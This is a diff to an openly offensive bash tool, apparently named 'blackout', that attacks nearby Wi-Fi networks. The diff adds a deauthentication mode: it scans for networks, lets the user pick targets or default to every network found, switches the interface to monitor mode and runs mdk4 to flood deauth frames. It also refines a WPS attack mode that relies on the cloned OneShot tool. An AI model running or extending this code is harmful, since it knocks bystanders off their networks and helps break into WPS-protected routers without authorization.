@@ -4,6 +4,7 @@
 # first_iface="wlan0"
 # second_iface="wlan1"
 
+ssid_config="config/ssid.txt"
 settings_file="config/settings.conf"
 source $settings_file
 
@@ -43,6 +44,21 @@ req_check(){
         git -C $(pwd)/config clone https://github.com/drygdryg/OneShot #clone oneshot repo
         sleep 2 && blackout_menu
     fi
+}
+
+chk_iface(){
+
+iface=$1
+
+if ip addr 2>/dev/null | grep -q "$iface"; then
+        printf "\e[0m[\e[92mi\e[0m] \e[92m$iface\e[0m is up!\n"
+        ip link set $iface up
+        return 1
+    else
+        printf "\e[0m[\e[91m!\e[0m] \e[91m$iface\e[0m is down\n"
+        back_to_menu
+    fi
+
 }
 
 back_to_menu(){
@@ -115,7 +131,7 @@ second_iface=$second_iface
 [ Select setting to edit: ]
 
 [1] Default wireless interface
-[2] Second default fireless interface
+[2] Second default fireless interface (with monitor mode support)
 [3] Reset settings
 [*] Back\n
 "
@@ -193,7 +209,7 @@ blackout_menu(){
 [ Choose option: ]
 
 [1] WPS Blackout
-[2] Deauth blackout (WAIT)
+[2] Deauth blackout 
 [3] All-in-one blackout (WAIT)
 [4] Settings
 [*] Exit
@@ -212,48 +228,15 @@ esac
 
 }
 
-check_ifaces(){
-    printf "\n\e[0m[\e[93m*\e[0m] Checking interfaces... \n"
-
-    if ip addr 2>/dev/null | grep -q "$first_iface"; then
-        printf "\n\e[0m[\e[92mi\e[0m] \e[92m$first_iface\e[0m is up!\n"
-        ip link set $first_iface up
-        first_iface_up=1
-    else
-        printf "\n\e[0m[\e[91m!\e[0m] \e[91m$first_iface\e[0m is down\n"
-        first_iface_up=0
-    fi
-
-    if ip addr 2>/dev/null | grep -q "$second_iface"; then
-        printf "\e[0m[\e[92mi\e[0m] \e[92m$second_iface\e[0m is up!\n"
-        ip link set $second_iface up
-        second_iface_up=1
-    else
-        printf "\e[0m[\e[91m!\e[0m] \e[91m$second_iface\e[0m is down\n"
-        second_iface_up=0
-    fi
-
-    sum_ifaces=$(expr $second_iface_up + $first_iface_up)
-
-    if [[ "$first_iface_up" == 0 && "$second_iface_up" == 0 ]]; then
-        printf "\n\e[0m[\e[91m!\e[0m] No interfaces found!\n"
-        exit
-    else
-        printf "\n\e[0m[\e[92mi\e[0m] We have \e[92m$sum_ifaces\e[0m inteface/s up!\n"
-    fi
-
-}
-
 wps_blackout(){
     banner
-    check_ifaces
+    chk_iface $first_iface
     printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"
-
-    printf "\n\e[0m[\e[93m*\e[0m] Scanning for WPS networks (15s)... \n"
+    printf "\n\e[0m[\e[93m*\e[0m] Scanning for WPS networks using \e[92m$first_iface\e[0m... \n"
 
     #iq200 sorting wps networks by signal strenght
     awker="$(pwd)/config/wifi.awk"
-    wps_all=$(iw dev wlan0 scan duration 5 | awk -f $awker | sort)
+    wps_all=$(iw dev $first_iface scan duration 15 | awk -f $awker | sort)
     wps_power=($(printf "$wps_all" | grep "yes" | awk '{print $1}'))
     wps_ssid=($(printf "$wps_all" | grep "yes" | awk '{print $5 $6 $7}'))
     wps_bssid=($(printf "$wps_all" | grep "yes" | awk '{print $2}'))
@@ -274,10 +257,7 @@ wps_blackout(){
         printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wps_bssid[@]} WPS networks! \n"
     fi
 
-   
-
     printf "\n[ Select \e[92mone\e[0m, \e[92mmultiple\e[0m comma-separated or press [\e[92mENTER\e[0m] for all target/s: ]\n\n"
-
     read -p "Choice: " target_number
 
     if [ -z "$target_number" ];
@@ -334,6 +314,86 @@ wps_blackout(){
         done
     fi
     
+}
+
+set_managed() {
+    iface=$1
+    printf "\n\e[0m[\e[93m*\e[0m] Putting $iface in managed mode... \n"
+    sudo ip link set $iface down
+    sudo iw $iface set type managed
+    sudo ip link set $iface up
+    printf "\n\e[0m[\e[92mi\e[0m] Enabled managed mode on $iface! \n"
+
+}
+
+set_mmode(){
+    iface=$1
+    printf "\n\e[0m[\e[93m*\e[0m] Putting $iface in monitor mode... \n"
+    sudo ip link set $iface down
+    sudo iw $iface set monitor control
+    sudo ip link set $iface up
+    printf "\n\e[0m[\e[92mi\e[0m] Enabled monitor mode on $iface! \n"
+}
+
+deauth_blackout(){
+    banner
+    chk_iface $second_iface
+    set_managed $second_iface
+    printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"
+    printf "\n\e[0m[\e[93m*\e[0m] Scanning for networks using \e[92m$second_iface\e[0m... \n"
+
+    awker="$(pwd)/config/wifi.awk"
+    wifi_all=$(iw dev $second_iface scan duration 15 | awk -f $awker | sort)
+    wifi_power=($(printf "$wifi_all" | awk '{print $1}'))
+    wifi_ssid=($(printf "$wifi_all"  | awk '{print $5 $6 $7}')) 
+    wifi_bssid=($(printf "$wifi_all" | awk '{print $2}'))
+    wifi_channel=($(printf "$wifi_all" | awk '{print $4}'))
+
+    i=0
+    while [ $i -lt ${#wifi_bssid[@]} ]
+    do
+        printf "\n[\e[92m$((i+1))\e[0m] \e[92m${wifi_ssid[$i]} \e[93m${wifi_bssid[$i]} \e[94mpwr:${wifi_power[$i]} \e[96mchnl:${wifi_channel[$i]}\e[0m"
+        i=$((i+1))
+    done
+
+    if [ -z "${#wifi_bssid[@]}" ];
+    then
+        printf "\n\n\e[0m[\e[91m!\e[0m] No networks found! \n"
+        back_to_menu
+    else
+        printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wifi_bssid[@]} networks! \n"
+    fi
+
+    printf "\n[ Select \e[92mone\e[0m, \e[92mmultiple\e[0m comma-separated or press [\e[92mENTER\e[0m] for all target/s: ]\n\n"
+    read -p "Choice: " wifi_number
+
+    if [ -z "$wifi_number" ];
+    then
+        target_bssid=("${wifi_bssid[@]}")
+        target_ssid=("${wifi_ssid[@]}")
+    else
+        target_bssid=($(echo $wifi_number | { while read -d, i; do printf "${wifi_bssid[$(($i-1))]}\n"; done; printf "${wifi_bssid[$(($i-1))]}\n"; }))
+        target_ssid=($(echo $wifi_number | { while read -d, i; do printf "${wifi_ssid[$(($i-1))]}\n"; done; printf "${wifi_ssid[$(($i-1))]}\n"; }))
+    fi
+
+    printf "\n\e[0m[\e[93m*\e[0m] Clearing old & writing ${#target_bssid[@]} new SSID/s to file...\n"
+
+    printf "" > $ssid_config
+    y=0
+    while [ $y -lt ${#target_bssid[@]} ]
+    do
+        printf "%s\n" "${target_bssid[$y]}" >> $ssid_config
+        y=$((y+1))
+    done
+
+    printf "\n\e[0m[\e[92mi\e[0m] Done!\n"
+
+    set_mmode $second_iface
+
+    printf "\n\e[0m[\e[93m*\e[0m] Running MDK4 on ${#target_bssid[@]} SSID/s, use Ctrl+C to abort!\n\n"
+    mdk4 $second_iface d -b $ssid_config
+
+    back_to_menu
 }
 
 check_root
